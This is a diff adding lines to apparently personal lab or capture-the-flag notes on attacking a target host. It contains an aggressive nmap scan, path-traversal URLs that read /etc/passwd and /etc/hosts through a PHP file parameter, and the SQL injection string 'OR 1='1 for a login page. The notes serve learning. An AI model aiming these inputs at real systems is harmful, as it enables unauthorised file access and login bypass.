@@ -6,7 +6,7 @@
 
 - (from linops)
 
-**nmap (ip)**
+**nmap (ip) -T5 2>/dev/null**
 
 **nmap -sV --script=http-enum (ip)**
 
@@ -18,6 +18,20 @@ ip:port
 
 - (you will perform web exploitation)
 
+**Look at notes for Web Exploitation and Sql**
 
+- (from the http enum, found the pages you should go to w/ ip)
 
+**(there will be a php that looks into files)** 
 
+**Ex: http://ip/getcareers.php?myfile=**
+
+(note: from here after the = you can change dir by "../" and look into other files)
+
+**Ex: http://ip/getcareers.php?myfile=../../../../../etc/passwd** 
+
+**Ex: http://ip/getcareers.php?myfile=../../../../../etc/hosts**
+
+- ( you will try and find the login page and try the 'OR 1='1)
+
+(
